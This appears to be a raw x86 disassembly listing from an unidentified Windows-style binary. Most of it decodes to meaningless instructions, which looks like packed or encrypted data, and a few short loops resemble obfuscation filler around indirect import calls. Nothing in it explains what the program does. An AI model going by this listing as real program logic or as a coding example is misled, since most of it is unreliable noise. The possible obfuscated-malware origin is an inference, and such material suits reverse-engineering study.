  4020fd:	jns    0x4020b5
  4020ff:	pop    ebp
  402100:	pop    esp
  402101:	fwait
  402102:	in     eax,0xaf
  402104:	out    0x51,al
  402106:	sbb    eax,0xdb31df6f
  40210b:	inc    ebx
  40210c:	sbb    DWORD PTR [eax-0x66f3f24],0x99eb4fa7
  402116:	int    0xb
  402118:	cmp    ecx,ebx
  40211a:	and    al,0x44
  40211c:	xchg   esp,eax
  40211d:	clc    
  40211e:	hlt    
  40211f:	rol    BYTE PTR [edx+0x6940b728],cl
  402125:	xor    BYTE PTR [edi],dh
  402127:	aam    0xe4
  402129:	adc    DWORD PTR [ebp-0x6968bff6],ebp
  40212f:	js     0x4021a6
  402131:	xchg   DWORD PTR [ebp+0x349dc9a6],ebx
  402137:	xchg   dh,cl
  402139:	add    DWORD PTR [ebp-0x4aec8eb5],edx
  40213f:	cmp    esi,DWORD PTR [edx-0x73bb3829]
  402145:	or     al,0x40
  402147:	test   eax,0x54a13532
  40214c:	inc    esi
  40214d:	or     bl,BYTE PTR [ebx-0x452689d8]
  402153:	int3   
  402154:	fidivr WORD PTR [esi+0x14]
  402157:	sbb    DWORD PTR [eax],edx
  402159:	xchg   ebx,eax
  40215a:	inc    ecx
  40215b:	aam    0xc5
  40215d:	sub    DWORD PTR [edx+0x1e],esp
  402160:	jne    0x402134
  402162:	icebp  
  402163:	ret    0xb4b8
  402166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402167:	leave  
  402168:	mov    BYTE PTR [ecx+0x150f9278],al
  40216e:	repnz out 0x16,al
  402171:	add    eax,0x26e3f69b
  402176:	push   ecx
  402177:	add    ch,BYTE PTR [edi+0x1e]
  40217a:	adc    al,0xbd
  40217c:	inc    esp
  40217d:	ret    0x43b5
  402180:	jmp    0x47717dae
  402185:	lods   ax,WORD PTR ds:[esi]
  402187:	test   eax,0xc3c37c74
  40218c:	out    0xf9,eax
  40218e:	stos   BYTE PTR es:[edi],al
  40218f:	push   edx
  402190:	test   al,bh
  402192:	inc    eax
  402193:	mov    dl,0xa8
  402195:	pop    edi
  402196:	dec    ebx
  402197:	loope  0x4021a6
  402199:	sbb    ebp,DWORD PTR [ecx+0x32]
  40219c:	add    esi,DWORD PTR [eax-0x75]
  40219f:	imul   eax,DWORD PTR [ecx],0xffffffd4
  4021a2:	(bad)  
  4021a4:	xchg   edi,eax
  4021a5:	lds    edi,FWORD PTR [esi]
  4021a7:	mov    bh,0x36
  4021a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021aa:	xchg   BYTE PTR [ecx-0x6b],cl
  4021ad:	mov    ecx,0x83ac9128
  4021b2:	fidivr DWORD PTR [esi+0x73]
  4021b5:	(bad)  
  4021b6:	mov    ds:0xbc46273b,eax
  4021bb:	sub    DWORD PTR [edx],eax
  4021bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021be:	neg    bl
  4021c0:	in     al,0x30
  4021c2:	mov    ebp,0xa588196b
  4021c7:	loopne 0x40215c
  4021c9:	mov    eax,0x7ce25b9
  4021ce:	push   0x336d2449
  4021d3:	hlt    
  4021d4:	mov    esi,0xb6386bdc
  4021d9:	add    esi,DWORD PTR [ebp+0x1deb8a13]
  4021df:	scas   al,BYTE PTR es:[edi]
  4021e0:	push   ecx
  4021e1:	mov    BYTE PTR [edx+edx*4+0x278122cb],cl
  4021e8:	jne    0x4021d4
  4021ea:	push   cs
  4021eb:	sbb    cl,ah
  4021ed:	pop    esp
  4021ee:	or     ebp,DWORD PTR [ebp-0xa4685df]
  4021f4:	mov    al,0xcd
  4021f6:	mov    cs,WORD PTR [ebp-0x519d1cbf]
  4021fc:	add    BYTE PTR [ebx+0x48b46053],cl
  402202:	ins    BYTE PTR es:[edi],dx
  402203:	mov    al,ds:0x38abf286
  402208:	and    al,0xe7
  40220a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40220b:	je     0x402196
  40220d:	shl    BYTE PTR [esi-0x5be73972],0xad
  402214:	cmc    
  402215:	shl    BYTE PTR [ebp+0x27],1
  402218:	(bad)  
  402219:	loopne 0x402225
  40221b:	push   ebx
  40221c:	shl    DWORD PTR [esi+0x16],0xa0
  402220:	jmp    0x402237
  402222:	fldcw  WORD PTR [esp+ebx*4]
  402225:	jbe    0x402289
  402227:	and    DWORD PTR [esi+0x76],eax
  40222a:	call   0x5390:0xcf642c9c
  402231:	cli    
  402232:	and    esp,DWORD PTR [ebp-0x123dc1c9]
  402238:	shr    DWORD PTR [ebx-0x654cf6dd],0x9
  40223f:	sbb    dl,BYTE PTR [ebp-0x58]
  402242:	mov    ds:0x9612389c,eax
  402247:	mov    dl,0xd7
  402249:	cld    
  40224a:	jmp    0x1a14:0x66838ec4
  402251:	sub    eax,ebp
  402253:	push   cs
  402254:	push   ebp
  402255:	xor    eax,0xb88148d4
  40225a:	sbb    eax,0xb40997d1
  40225f:	repnz pop es
  402261:	test   al,0xab
  402263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402264:	pop    es
  402265:	lods   al,BYTE PTR ds:[esi]
  402266:	dec    edi
  402267:	xor    BYTE PTR [ebx],dh
  402269:	inc    edx
  40226a:	mov    eax,esp
  40226c:	in     al,dx
  40226d:	sbb    dh,bl
  40226f:	and    dl,dh
  402271:	dec    eax
  402272:	pushf  
  402273:	push   edi
  402274:	jecxz  0x4022ba
  402276:	cmp    BYTE PTR [ebp+0xe8f48fd],bh
  40227c:	mul    bl
  40227e:	and    BYTE PTR [ecx-0x32],dl
  402281:	or     eax,DWORD PTR [ebx-0x4d]
  402284:	sbb    eax,0xcae59277
  402289:	fsub   DWORD PTR [ebx+0x57a01488]
  40228f:	mov    ?,WORD PTR [edi-0x79]
  402292:	and    DWORD PTR [ebx],0x3a35aa11
  402298:	in     eax,0x85
  40229a:	cli    
  40229b:	or     DWORD PTR [edx-0x26],edx
  40229e:	jle    0x402293
  4022a0:	mov    bl,0x52
  4022a2:	or     bl,al
  4022a4:	xchg   ebp,eax
  4022a5:	out    0x11,eax
  4022a7:	loopne 0x40224f
  4022a9:	(bad)  
  4022aa:	cmp    al,0x5
  4022ac:	clc    
  4022ad:	loope  0x402289
  4022af:	rcl    DWORD PTR [eax+0x4152f7b1],1
  4022b5:	cdq    
  4022b6:	jns    0x40231a
  4022b8:	ins    BYTE PTR es:[edi],dx
  4022b9:	cwde   
  4022ba:	sbb    BYTE PTR [ecx-0x262ece10],dl
  4022c0:	cli    
  4022c1:	jg     0x4022da
  4022c3:	xor    ah,dh
  4022c5:	xor    eax,0x587d41ed
  4022ca:	xchg   esp,eax
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42edef,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42edef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42edef,edx
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	mov    cl,0xd8
  402363:	xchg   ebx,eax
  402364:	inc    edi
  402365:	fild   DWORD PTR [ebx]
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x402395
  40236e:	add    cl,BYTE PTR [esi+0x4a]
  402371:	xchg   ebp,eax
  402372:	or     cl,ah
  402374:	mov    ah,0xa8
  402376:	mov    edi,0xcd159d0a
  40237b:	ret    
  40237c:	inc    DWORD PTR [edi-0x23]
  40237f:	pop    edi
  402380:	pop    edx
  402381:	mov    cs,WORD PTR [edi-0x3f]
  402384:	push   ss
  402385:	test   bl,al
  402387:	jmp    0xd8ee:0xdfe7982
  40238e:	mov    ch,0xe8
  402390:	jne    0x4023de
  402392:	dec    ecx
  402393:	and    al,0x46
  402395:	fucomi st,st(1)
  402397:	cmp    eax,0xe9bba926
  40239c:	pop    ebp
  40239d:	jbe    0x402406
  40239f:	or     edi,DWORD PTR [edx+ebp*1+0x6a55caee]
  4023a6:	stos   BYTE PTR es:[edi],al
  4023a7:	mov    DWORD PTR [edx+0x3b],ecx
  4023aa:	iret   
  4023ab:	into   
  4023ac:	jecxz  0x402402
  4023ae:	sahf   
  4023af:	mov    DWORD PTR [ebx-0x1152e447],ebx
  4023b5:	add    bl,cl
  4023b7:	push   esi
  4023b8:	adc    DWORD PTR [ebp+0x5c91fdef],esi
  4023be:	xchg   esp,eax
  4023bf:	and    eax,0x81a92fb4
  4023c4:	fpatan 
  4023c6:	aam    0x37
  4023c8:	rol    BYTE PTR [ebx+0x1c],1
  4023cb:	sub    BYTE PTR [ecx],0xb6
  4023ce:	and    eax,0xd360cce
  4023d3:	jmp    0x2341:0x2f9399d5
  4023da:	iret   
  4023db:	and    ebp,DWORD PTR [edx+0xfe609d8]
  4023e1:	cmp    esp,0xffffffaf
  4023e4:	pop    ebp
  4023e5:	gs popf 
  4023e7:	stos   BYTE PTR es:[edi],al
  4023e8:	repz xchg ebp,eax
  4023ea:	cwde   
  4023eb:	push   ebp
  4023ec:	hlt    
  4023ed:	mov    ch,0xd6
  4023ef:	cmp    dl,BYTE PTR [ecx+0xb1ea96e]
  4023f5:	ret    
  4023f6:	iret   
  4023f7:	fs pop edx
  4023f9:	call   0x51f9422
  4023fe:	jbe    0x402457
  402400:	xor    eax,0x866ee17b
  402405:	in     eax,dx
  402406:	sti    
  402407:	push   ecx
  402408:	pusha  
  402409:	jns    0x4023c7
  40240b:	and    DWORD PTR [esi+0x7605cfc9],esi
  402411:	icebp  
  402412:	cmp    bl,BYTE PTR [esi]
  402414:	cs mov bl,0xcb
  402417:	repnz adc al,BYTE PTR [edx-0x1]
  40241b:	jo     0x4023f6
  40241d:	cmp    BYTE PTR [ebp-0x42],bl
  402420:	mov    gs,WORD PTR [edx+0x761d8e4]
  402426:	outs   dx,DWORD PTR ds:[esi]
  402427:	and    eax,0x8386ae1b
  40242c:	pop    edi
  40242d:	dec    eax
  40242e:	pusha  
  40242f:	sbb    al,0x3c
  402431:	daa    
  402432:	jl     0x4023fc
  402434:	push   cs
  402435:	jmp    0x821a:0x5910b384
  40243c:	pop    esi
  40243d:	daa    
  40243e:	jle    0x402429
  402440:	push   edx
  402441:	jl     0x4024c2
  402443:	push   es
  402444:	shl    ecx,0xc3
  402447:	in     al,dx
  402448:	sub    BYTE PTR [edx],0x1e
  40244b:	cld    
  40244c:	mov    al,0xab
  40244e:	sti    
  40244f:	push   ds
  402450:	dec    esi
  402451:	and    al,0xbc
  402453:	cmc    
  402454:	jle    0x402472
  402456:	add    esi,DWORD PTR [ecx+0x7575f6b0]
  40245c:	jbe    0x402467
  40245e:	neg    BYTE PTR [edi+0x496808ed]
  402464:	pop    esi
  402465:	sbb    esp,DWORD PTR [eax-0x6a]
  402468:	push   edx
  402469:	rcl    DWORD PTR [edx],1
  40246b:	xorps  xmm1,XMMWORD PTR [ebx+0x7b1ec002]
  402472:	(bad)
  402475:	pop    esp
  402476:	(bad)  
  402477:	loope  0x40248f
  402479:	aam    0x67
  40247b:	pop    ebx
  40247c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40247d:	add    edi,DWORD PTR [edx]
  40247f:	jmp    0xfd31:0x2f598c28
  402486:	aas    
  402487:	cmp    eax,DWORD PTR [eax]
  402489:	(bad)  
  40248a:	scas   al,BYTE PTR es:[edi]
  40248b:	mov    ds:0xc38974da,al
  402490:	cld    
  402491:	and    ecx,ecx
  402493:	shl    DWORD PTR [ebp-0x428ce1ed],1
  402499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40249a:	ret    
  40249b:	enter  0xff52,0xe1
  40249f:	xlat   BYTE PTR ds:[ebx]
  4024a0:	dec    edi
  4024a1:	xor    bl,BYTE PTR [eax+0x6ca6861b]
  4024a7:	inc    ebp
  4024a8:	push   esi
  4024a9:	daa    
  4024aa:	iret   
  4024ab:	outs   dx,BYTE PTR ds:[esi]
  4024ac:	iret   
  4024ad:	(bad)  
  4024ae:	ss or  al,0x7b
  4024b1:	es repz cmp ah,bl
  4024b5:	(bad)  
  4024b6:	mov    ds:0x300b06f4,al
  4024bb:	xchg   esi,eax
  4024bc:	stos   DWORD PTR es:[edi],eax
  4024bd:	xor    BYTE PTR [eax],0xf4
  4024c0:	push   ss
  4024c1:	push   esi
  4024c2:	nop
  4024c3:	sti    
  4024c4:	mov    esi,fs
  4024c6:	out    dx,eax
  4024c7:	mov    dh,0xee
  4024c9:	push   ds
  4024ca:	adc    dh,dh
  4024cc:	popa   
  4024cd:	cs gs (bad) 
  4024d0:	mov    bh,0xc2
  4024d2:	in     eax,0x72
  4024d4:	sti    
  4024d5:	push   esp
  4024d6:	pop    esi
  4024d7:	push   eax
  4024d8:	jne    0x402536
  4024da:	leave  
  4024db:	mov    edx,0xbe4ccd25
  4024e0:	mov    BYTE PTR [esi+0x64],al
  4024e3:	jbe    0x40247b
  4024e5:	mov    BYTE PTR [edx+0x3becd514],al
  4024eb:	pop    eax
  4024ec:	push   esp
  4024ed:	(bad)  [eax+eax*4+0x440e1814]
  4024f4:	and    bh,BYTE PTR [eax+ecx*1+0x3e3cdf85]
  4024fb:	xor    BYTE PTR [ecx+0x230de2ee],al
  402501:	lds    edi,FWORD PTR [ebx+eax*1-0xc195781]
  402508:	cld    
  402509:	push   0xffffffb3
  40250b:	imul   ebp,DWORD PTR gs:[edx-0xf6b7a05],0xffffffc3
  402513:	inc    eax
  402514:	xchg   ebp,eax
  402515:	call   0x7b2b:0xde7f2e6a
  40251c:	stc    
  40251d:	aaa    
  40251e:	aaa    
  40251f:	add    esi,esi
  402521:	push   0x433075ad
  402526:	xor    BYTE PTR [eax],ah
  402528:	test   BYTE PTR [ecx],bh
  40252a:	jle    0x4025a4
  40252c:	iret   
  40252d:	or     ch,BYTE PTR [edx+0x686421ac]
  402533:	or     eax,0x7e75c9ca
  402538:	push   ds
  402539:	js     0x40254a
  40253b:	sahf   
  40253c:	imul   ebx,DWORD PTR ds:0x3d9b990e,0xffffff9b
  402543:	(bad)  
  402544:	fld    QWORD PTR [esi-0x7eae0d96]
  40254a:	and    eax,0x42edcb
  40254f:	cmp    DWORD PTR [ebx],esi
  402551:	add    BYTE PTR [eax],al
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs fwait
  402613:	sbb    BYTE PTR [ebp+0x7e013ec9],ch
  402619:	jle    0x402670
  40261b:	jg     0x40269b
  40261d:	jle    0x4025de
  40261f:	or     eax,0x2ac1d1ac
  402624:	lea    eax,[ebx]
  402626:	mov    dh,ch
  402628:	push   esp
  402629:	mov    ecx,?
  40262b:	jp     0x4025f6
  40262d:	mov    al,0xb4
  40262f:	ins    BYTE PTR es:[edi],dx
  402630:	push   ecx
  402631:	xor    BYTE PTR [edi+ebp*4+0x6a3d5b6],bh
  402638:	jo     0x4025fd
  40263a:	xor    DWORD PTR [ebx+ebx*4+0x452c1ec5],ebp
  402641:	aaa    
  402642:	fidiv  DWORD PTR [edi-0x6e]
  402645:	adc    al,0x78
  402647:	cmc    
  402648:	ret    
  402649:	sbb    al,0xa
  40264b:	aas    
  40264c:	jbe    0x402638
  40264e:	cmp    eax,0xac261838
  402653:	add    DWORD PTR [bx-0x8e8],edi
  402658:	xchg   esi,eax
  402659:	sub    cl,0x4d
  40265c:	test   al,0xbc
  40265e:	jl     0x4025ed
  402660:	xor    al,0xe
  402662:	sub    ebx,edx
  402664:	or     eax,0x286cbd31
  402669:	test   eax,0xe1cd6ca6
  40266e:	add    BYTE PTR [ecx+0x5d],dh
  402671:	bound  edi,QWORD PTR [ecx+edi*8+0x60]
  402675:	das    
  402676:	mov    esi,0xa08a66f3
  40267b:	lds    edi,FWORD PTR [esi+0x37]
  40267e:	mov    dl,0xe
  402680:	jp     0x402616
  402682:	cmp    eax,0x42e0f3c
  402687:	into   
  402688:	xchg   edi,eax
  402689:	and    DWORD PTR [ebx+0x3e],ebx
  40268c:	jecxz  0x4026a6
  40268e:	scas   al,BYTE PTR es:[edi]
  40268f:	xor    edx,ebx
  402691:	xchg   edi,eax
  402692:	mov    edi,0xb2d7d533
  402697:	pop    ebp
  402698:	push   ss
  402699:	cmp    eax,DWORD PTR [ebx+0x6d]
  40269c:	pop    ebp
  40269d:	fild   QWORD PTR fs:[ecx+esi*4+0x61dedad]
  4026a5:	pop    ebx
  4026a6:	pop    ss
  4026a7:	jp     0x40268c
  4026a9:	ins    BYTE PTR es:[edi],dx
  4026aa:	or     esi,DWORD PTR [eax]
  4026ac:	inc    eax
  4026ad:	call   0xb2db4ba3
  4026b2:	std    
  4026b3:	stos   DWORD PTR es:[edi],eax
  4026b4:	addr16 ret 0xd23
  4026b8:	aas    
  4026b9:	dec    ebp
  4026ba:	push   0x12
  4026bc:	add    eax,0xd3afa5fb
  4026c1:	dec    ebp
  4026c2:	mov    ah,0x8d
  4026c4:	xor    bh,BYTE PTR ss:[esi]
  4026c7:	adc    dl,dl
  4026c9:	xor    al,0x80
  4026cb:	mov    BYTE PTR [ebp+0xbdc9b2e],dl
  4026d1:	mov    ds:0x43e2922f,eax
  4026d6:	gs jge 0x4026ab
  4026d9:	push   ecx
  4026da:	push   edx
  4026db:	ret    
  4026dc:	fucom  st(0)
  4026de:	icebp  
  4026df:	mov    ds:0x147b5340,al
  4026e4:	xchg   ah,dl
  4026e6:	jmp    0x4026a8
  4026e8:	mov    cl,0xdf
  4026ea:	pop    ebx
  4026eb:	pop    ebx
  4026ec:	mov    bl,0x38
  4026ee:	push   eax
  4026ef:	in     al,dx
  4026f0:	jbe    0x40269c
  4026f2:	sub    DWORD PTR [esi-0x34],0xffffffeb
  4026f6:	test   ebx,edx
  4026f8:	ds dec edi
  4026fa:	jle    0x402692
  4026fc:	hlt    
  4026fd:	fmul   st,st(3)
  4026ff:	mov    al,0x19
  402701:	daa    
  402702:	cmc    
  402703:	fisub  DWORD PTR [edi-0x2b]
  402706:	pop    edx
  402707:	pop    edi
  402708:	add    BYTE PTR [esi],bh
  40270a:	out    dx,eax
  40270b:	sti    
  40270c:	das    
  40270d:	aaa    
  40270e:	dec    ebx
  40270f:	aad    0xd5
  402711:	retf   
  402712:	adc    ecx,ebx
  402714:	pop    ecx
  402715:	in     eax,0x10
  402717:	mov    al,ds:0x1196a8cc
  40271c:	and    al,BYTE PTR [eax+0x75777a97]
  402722:	adc    eax,0x6719e15
  402727:	pushf  
  402728:	pop    edx
  402729:	cmp    eax,0x71452841
  40272e:	stos   BYTE PTR es:[edi],al
  40272f:	and    al,0x65
  402731:	jge    0x40271f
  402733:	in     eax,dx
  402734:	or     cl,BYTE PTR [edx-0x55b1bf27]
  40273a:	ret    0xa6c2
  40273d:	jmp    0x219d:0xe8818ed2
  402744:	das    
  402745:	push   esi
  402746:	mov    al,ds:0xbf3d5d95
  40274b:	inc    edx
  40274c:	add    bl,ah
  40274e:	loope  0x4026d8
  402750:	fadd   DWORD PTR [eax+edx*8]
  402753:	mov    edi,0x5e77b2f9
  402758:	sub    al,0xac
  40275a:	adc    bl,dh
  40275c:	jp     0x402723
  40275e:	(bad)  
  40275f:	ins    BYTE PTR es:[edi],dx
  402760:	mov    ch,BYTE PTR [ebx+0x39]
  402763:	and    edi,ebp
  402765:	sub    edi,DWORD PTR ds:0xd0ce13c1
  40276b:	jb     0x402731
  40276d:	out    0x6a,eax
  40276f:	jle    0x402702
  402771:	adc    DWORD PTR [esi],eax
  402773:	das    
  402774:	push   edx
  402775:	repz sub DWORD PTR [edx+0x1c],esi
  402779:	mov    al,ds:0x8933cde8
  40277e:	imul   edi,ebx,0xffffff93
  402781:	mov    dh,0xe3
  402783:	mov    esp,0x1c84d8f4
  402788:	add    eax,DWORD PTR [ebp+0x13]
  40278b:	mov    ds,esp
  40278d:	pop    es
  40278e:	mov    WORD PTR [edi+edx*2+0x47],es
  402792:	stos   DWORD PTR es:[edi],eax
  402793:	hlt    
  402794:	clc    
  402795:	daa    
  402796:	mov    ebx,0x957e673e
  40279b:	in     eax,dx
  40279c:	push   0xd04ad7b3
  4027a1:	xor    BYTE PTR [esi+edi*1],al
  4027a4:	in     eax,0x2f
  4027a6:	clc    
  4027a7:	inc    ebp
  4027a8:	xchg   BYTE PTR ds:0x55f1a68c,ah
  4027ae:	pushf  
  4027af:	stos   DWORD PTR es:[edi],eax
  4027b0:	jp     0x402813
  4027b2:	add    al,0x47
  4027b4:	cmp    al,0x52
  4027b6:	xlat   BYTE PTR ds:[ebx]
  4027b7:	inc    esp
  4027b8:	push   eax
  4027b9:	scas   eax,DWORD PTR es:[edi]
  4027ba:	repz imul eax,DWORD PTR [esi],0xebce44c1
  4027c1:	sbb    BYTE PTR ds:0xf6dcf097,al
  4027c7:	div    BYTE PTR [ecx-0x5e]
  4027ca:	int    0xf2
  4027cc:	(bad)  
  4027cd:	shl    BYTE PTR [ecx-0x471ca482],1
  4027d3:	out    0x7b,al
  4027d5:	add    eax,0xc967f5e9
  4027da:	inc    edi
  4027db:	xchg   ebp,eax
  4027dc:	sub    ebx,DWORD PTR ds:0x322015f5
  4027e2:	xor    edi,ebx
  4027e4:	mov    ds:0x8aecf3af,al
  4027e9:	mov    ebx,0xcea21e03
  4027ee:	ss pop ecx
  4027f0:	daa    
  4027f1:	mov    eax,ds:0xf8b7a9f5
  4027f6:	in     eax,0xc8
  4027f8:	fst    DWORD PTR [edi-0x75]
  4027fb:	jge    0x40280d
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    edi,esi
  402828:	rol    bl,1
  40282a:	adc    DWORD PTR ds:0x557e7e0f,0x467e7e7f
  402834:	xor    eax,0xf129e2e7
  402839:	jne    0x4027ca
  40283b:	sub    DWORD PTR [ecx],edx
  40283d:	nop
  40283e:	out    dx,eax
  40283f:	and    eax,edi
  402841:	test   eax,0x60266b38
  402846:	xor    ebp,edi
  402848:	repnz lds ebx,FWORD PTR [edi-0x16bd736b]
  40284f:	hlt    
  402850:	mov    ebx,0x221a9eef
  402855:	jle    0x40288c
  402857:	loope  0x402884
  402859:	sahf   
  40285a:	xlat   BYTE PTR ds:[ebx]
  40285b:	cmp    eax,0xefd68fa8
  402860:	fwait
  402861:	dec    ebp
  402862:	loope  0x4028d6
  402864:	je     0x402831
  402866:	mov    esp,0x37a4e75
  40286b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40286c:	xor    edx,DWORD PTR [edi+ebp*8+0x46]
  402870:	and    ebx,DWORD PTR [eax-0x72b2e280]
  402876:	mov    al,ds:0x62e9b663
  40287b:	inc    edi
  40287c:	int    0xbf
  40287e:	dec    edx
  40287f:	js     0x402823
  402881:	hlt    
  402882:	std    
  402883:	jns    0x4028a9
  402885:	adc    esi,ecx
  402887:	sbb    eax,0x34a2a0ef
  40288c:	test   al,0x83
  40288e:	jb     0x4028fe
  402890:	xor    bh,ch
  402892:	fwait
  402893:	out    0x66,eax
  402895:	and    BYTE PTR [edi-0x11defc15],cl
  40289b:	in     al,0x9d
  40289d:	add    eax,0xff87ba51
  4028a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a3:	xchg   edi,eax
  4028a4:	ja     0x402899
  4028a6:	aam    0x3e
  4028a8:	arpl   cx,bx
  4028aa:	dec    edx
  4028ab:	jmp    0x4028ab
  4028ad:	sbb    DWORD PTR [ebp+ebp*2+0x1f],0xb52f7bc7
  4028b5:	xchg   ecx,eax
  4028b6:	sbb    BYTE PTR [ecx],dl
  4028b8:	std    
  4028b9:	pop    esp
  4028ba:	push   ecx
  4028bb:	push   ss
  4028bc:	in     eax,0x33
  4028be:	dec    eax
  4028bf:	repnz aad 0xdf
  4028c2:	xor    al,0x53
  4028c4:	(bad)  
  4028c6:	lds    ebx,FWORD PTR [edi]
  4028c8:	push   0xffffffb0
  4028ca:	lods   al,BYTE PTR ds:[esi]
  4028cb:	mov    BYTE PTR es:[ebx+0x5e],dl
  4028cf:	inc    esi
  4028d0:	fwait
  4028d1:	pusha  
  4028d2:	xor    bl,ch
  4028d4:	adc    eax,0xd442a40b
  4028d9:	add    ax,0x121b
  4028dd:	sub    bh,BYTE PTR [ebx-0x218f9055]
  4028e3:	dec    esp
  4028e4:	clc    
  4028e5:	outs   dx,DWORD PTR ds:[esi]
  4028e6:	mov    ch,0x45
  4028e8:	adc    DWORD PTR [edx+ecx*4],edx
  4028eb:	call   0x5d3a:0xa95fb57a
  4028f2:	lea    ebx,[ecx-0x3b]
  4028f5:	retf   
  4028f6:	mov    ebx,DWORD PTR [ebx-0x12]
  4028f9:	aad    0xf2
  4028fb:	cmp    bl,BYTE PTR [edx-0x2f]
  4028fe:	mov    ds:0xb71258,al
  402903:	sbb    BYTE PTR es:[eax+0x28],bl
  402907:	or     bh,BYTE PTR [esi]
  402909:	jns    0x4028b1
  40290b:	mov    bl,0xb9
  40290d:	inc    esi
  40290e:	jmp    0x551aa8cd
  402913:	dec    edx
  402914:	mov    al,ds:0x43183c72
  402919:	or     eax,0x76a84aef
  40291e:	jle    0x4028a5
  402920:	data16 daa 
  402922:	push   edi
  402923:	test   DWORD PTR [ecx-0x646c639f],ecx
  402929:	dec    esp
  40292a:	and    al,0xf
  40292c:	jecxz  0x4028d9
  40292e:	add    eax,DWORD PTR [ecx+0x3dc7e2fb]
  402934:	sbb    DWORD PTR [esi+0x64],0x51ca1b36
  40293b:	jo     0x40299c
  40293d:	mov    edx,0x6fa6119e
  402942:	or     cl,cl
  402944:	scas   eax,DWORD PTR es:[edi]
  402945:	or     DWORD PTR [edx],ebp
  402947:	(bad)  
  402948:	adc    eax,0xaa6f7eb9
  40294d:	hlt    
  40294e:	pop    ss
  40294f:	jnp    0x40295a
  402951:	popa   
  402952:	leave  
  402953:	scas   eax,DWORD PTR es:[edi]
  402954:	icebp  
  402955:	test   dl,dh
  402957:	cld    
  402958:	jno    0x4029d1
  40295a:	outs   dx,DWORD PTR ds:[esi]
  40295b:	jns    0x4028ef
  40295d:	test   edi,ecx
  40295f:	repnz rol DWORD PTR [esp+esi*4+0x2520f9f1],1
  402967:	loop   0x4029cc
  402969:	enter  0xbde5,0x75
  40296d:	int    0x21
  40296f:	sbb    al,0x60
  402971:	sub    al,0xe1
  402973:	mov    edi,0xa828e2eb
  402978:	es mov esp,0x78f6b7c8
  40297e:	xor    al,0x97
  402980:	das    
  402981:	maxps  xmm0,XMMWORD PTR [ebx-0x3002b5de]
  402988:	out    dx,al
  402989:	or     ah,BYTE PTR [bp+si]
  40298c:	mov    eax,ds:0xfaec20f3
  402991:	jo     0x4029a3
  402993:	repnz xor BYTE PTR [ebp-0x3ca84588],bh
  40299a:	add    bh,al
  40299c:	retf   
  40299d:	push   ds
  40299e:	dec    edx
  40299f:	loopne 0x402929
